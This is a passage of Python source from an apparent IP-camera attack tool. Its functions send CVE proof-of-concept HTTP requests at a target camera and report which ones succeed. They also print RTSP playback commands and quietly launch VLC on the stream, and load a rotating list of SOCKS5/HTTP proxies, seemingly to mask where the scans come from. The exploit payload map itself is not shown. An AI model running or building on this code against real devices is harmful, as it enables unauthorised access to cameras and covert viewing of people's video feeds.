def try_exploit_cve(ip: str, port: int, camera_type: str, timeout: float = 4.0) -> list:
    """
    Attempt HTTP-based PoC requests for known CVEs matching the camera type.
    Returns list of dicts: {cve_id, desc, status_code, exploited, response_snippet}.
    """
    G, Y, W, R, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED, Fore.CYAN
    cve_list = check_cve(camera_type)
    if not cve_list:
        return []

    results = []
    base_url = f"http://{ip}:{port}"

    for cve_id, cve_desc, cve_sev in cve_list:
        exploit = _CVE_EXPLOIT_MAP.get(cve_id)
        if not exploit:
            continue
        try:
            method  = exploit['method']
            path    = exploit['path']
            headers = exploit.get('headers', {})
            body    = exploit.get('body', b'')
            ok_codes = exploit.get('success_codes', [200])
            hint    = exploit.get('success_hint')
            desc    = exploit.get('desc', cve_desc)

            url = base_url + path
            resp = requests.request(
                method, url,
                headers=headers,
                data=body,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            status = resp.status_code
            snippet = resp.text[:120].replace('\n', ' ').replace('\r', '')
            exploited = (status in ok_codes and
                         (hint is None or hint.lower() in resp.text.lower()))

            icon = '🔓' if exploited else '🔒'
            color = R if exploited else Y
            print(f"  {icon} {color}[{cve_id}]{W} {desc}")
            print(f"       {C}→ HTTP {status}  {'VULNERABLE' if exploited else 'not triggered'}{W}")
            if exploited and snippet:
                print(f"       Response: {snippet[:80]}...")

            results.append({
                'cve_id': cve_id,
                'desc': desc,
                'severity': cve_sev,
                'status_code': status,
                'exploited': exploited,
                'response_snippet': snippet,
            })
        except Exception as _ex:
            print(f"  {Y}[{cve_id}] probe error: {_ex}{W}")
            results.append({
                'cve_id': cve_id,
                'desc': cve_desc,
                'severity': cve_sev,
                'status_code': -1,
                'exploited': False,
                'response_snippet': str(_ex)[:80],
            })
    return results


def print_rtsp_play_commands(rtsp_url: str) -> None:
    """Print VLC and ffplay commands to play an RTSP stream."""
    G, Y, W, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.CYAN
    print(f"\n  {C}━━ RTSP Play Commands ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"  {G}[VLC]   {W}vlc \"{rtsp_url}\"")
    print(f"  {G}[ffplay]{W} ffplay -rtsp_transport tcp \"{rtsp_url}\"")
    print(f"  {G}[mpv]   {W}mpv \"{rtsp_url}\"")
    print(f"  {C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    # Try to launch VLC in background (best-effort, non-blocking)
    try:
        import shutil as _sh
        _vlc = _sh.which('vlc') or _sh.which('cvlc')
        if _vlc:
            import subprocess as _sp
            _sp.Popen([_vlc, '--intf', 'dummy', rtsp_url],
                      stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
            print(f"  {G}[✓] Launched VLC in background{W}")
    except Exception:
        pass


# ── Proxy / SOCKS5 Support ────────────────────────────────────────────────────
_PROXY_LIST: list = []
_proxy_idx   = 0
_proxy_lock  = threading.Lock()
PROXY_FILE   = os.path.join(SCRIPT_DIR, 'proxies.txt')
def load_proxies() -> None:
    """Load proxy list from proxies.txt (one per line: socks5://host:port or http://...)."""
    global _PROXY_LIST
    if not os.path.exists(PROXY_FILE):
        return
    proxies = []
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as _f:
            for _line in _f:
                _p = _line.strip()
                if not _p or _p.startswith('#'):
                    continue
                if not _p.startswith(('http', 'socks')):
                    _p = 'socks5://' + _p
                proxies.append({'http': _p, 'https': _p})
    except Exception:
        pass
    _PROXY_LIST = proxies
    if proxies:
        print(f"{Fore.GREEN}[✓] Loaded {len(proxies)} proxies from proxies.txt{Style.RESET_ALL}")
def get_next_proxy() -> dict:
    global _proxy_idx
    if not _PROXY_LIST:
        return {}
    with _proxy_lock:
        p = _PROXY_LIST[_proxy_idx % len(_PROXY_LIST)]
        _proxy_idx += 1
    return p

